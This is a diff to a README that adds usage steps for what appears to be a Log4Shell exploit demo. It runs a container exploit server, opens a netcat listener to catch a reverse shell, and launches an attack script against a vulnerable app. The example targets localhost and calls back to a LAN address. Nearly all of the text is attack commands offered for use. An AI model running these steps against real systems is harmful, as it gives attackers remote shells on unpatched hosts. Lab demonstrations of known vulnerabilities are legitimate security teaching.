@@ -19,4 +19,20 @@ If you run it on a computer that has the address 192.168.50.100 you should run:\
 podman run -p 1389:1389 -p 8888:8888  quay.io/apoczeka/log4shell -i 192.168.50.100 -l 1389 -p 8888
 
 
+### 3. Listen for revers shell
 
+```bash
+nc -l 5555
+````
+
+### 4. Attack!
+
+```bash
+./attack-revers.sh <vuln_app> <exploit_server> <revers_host>
+```
+
+For example:
+
+```bash
+./attack-revers.sh localhost:8080 192.168.50.100:1389 192.168.50.100:5555
+```
